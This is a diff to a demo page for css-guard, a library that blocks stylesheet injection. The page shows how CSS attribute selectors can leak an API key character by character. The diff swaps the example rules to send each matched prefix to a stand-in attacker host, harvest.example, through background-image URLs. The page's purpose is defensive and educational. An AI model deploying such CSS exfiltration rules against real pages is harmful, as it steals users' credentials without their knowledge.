@@ -12,8 +12,9 @@
     <h1>A stylesheet can read what your users type.</h1>
     <p class="lede">
       No JavaScript. No permission prompt. Nothing visible on screen.
-      The requests below are <b>real</b> — your browser is making them right now. Open your network
-      tab, filter for <code>collect</code>, and watch an API key leave one character at a time.
+      What you'll watch is <b>real</b>: the stylesheet matching your API key one character at a time.
+      Every match is a URL the CSS hands your browser to fetch from the attacker — in a normal tab,
+      open your network panel and you'll see the requests leave.
     </p>
     <div class="cta">
       <a class="btn primary" href="#try">See it happen</a>
@@ -53,7 +54,7 @@
 
     <div class="row">
       <label class="switch">
-        <input type="checkbox" id="toggle" disabled>
+        <input type="checkbox" id="toggle">
         <span>Apply the theme</span>
       </label>
       <span class="hint" id="state">theme off</span>
@@ -80,10 +81,10 @@
 
 <section class="explain">
   <h2>The whole attack is this</h2>
-  <pre class="code"><code>input#apikey[value^="s"]  { background-image: url(collect/?apikey=s); }
-input#apikey[value^="k"]  { background-image: url(collect/?apikey=k); }
-input#apikey[value^="sk"] { background-image: url(collect/?apikey=sk); }
-<span class="dim">… one rule per prefix, for every character you care about</span></code></pre>
+  <pre class="code"><code>input#apikey[value^="s"]  { background-image: url(https://harvest.example/x?apikey=s); }
+input#apikey[value^="sk"] { background-image: url(https://harvest.example/x?apikey=sk); }
+input#apikey[value^="sk-"]{ background-image: url(https://harvest.example/x?apikey=sk-); }
+<span class="dim">… one rule per known prefix, growing one character at a time</span></code></pre>
   <p>
     An attribute selector matches on the value that is <em>there</em>. A match paints a background.
     Painting a background makes a request. Nothing else is required — and there is no CSS feature you
@@ -98,12 +99,13 @@ input#apikey[value^="sk"] { background-image: url(collect/?apikey=sk); }
     the other three leak with no help at all.
   </p>
   <p class="note">
-    One honest limit, visible in this very demo: a browser only fetches a background image when the
-    element is <em>actually painted</em>. Off-screen or <code>display:none</code> elements are safe.
-    A real attacker sidesteps this by hanging the selectors on things that are always painted —
-    <code>html</code>, <code>body</code>, a toolbar — which is why the panel scrolls into view when
-    you turn the theme on. css-guard blocks the stylesheet either way; the network request is the
-    payload, and it is refused before it can exist.
+    <b>How this page reads the leak:</b> it inspects which rule the browser resolved onto the field —
+    that <em>is</em> the leak, the CSS matching your secret prefix by prefix. In a normal foreground
+    browser each match also fetches its <code>https://harvest.example</code> URL; that fetch is the
+    delivery. One honest limit either way: a background image only loads for an element that is
+    actually painted, so <code>display:none</code> fields are safe — a real attacker just hangs the
+    selectors on things always on screen. css-guard blocks the stylesheet before any of it: a remote
+    URL in a skin is an error, and an error is never injected.
   </p>
   <label class="switch">
     <input type="checkbox" id="mirror">
@@ -153,8 +155,9 @@ inject(userStylesheet);</code></pre>
     MIT · <a href="https://github.com/LinzOpen/css-guard/blob/main/README.zh-CN.md">简体中文</a>
   </p>
   <p class="hint">
-    This page makes real requests to <code>collect/</code> on this same domain. They 404. Nothing is
-    sent anywhere, and there is no analytics on this page.
+    The attack URLs point at <code>harvest.example</code>, a domain that doesn't resolve — so nothing
+    actually reaches an attacker here, but the requests are real attempts your browser makes. There is
+    no analytics on this page and nothing is stored.
   </p>
 </footer>
 
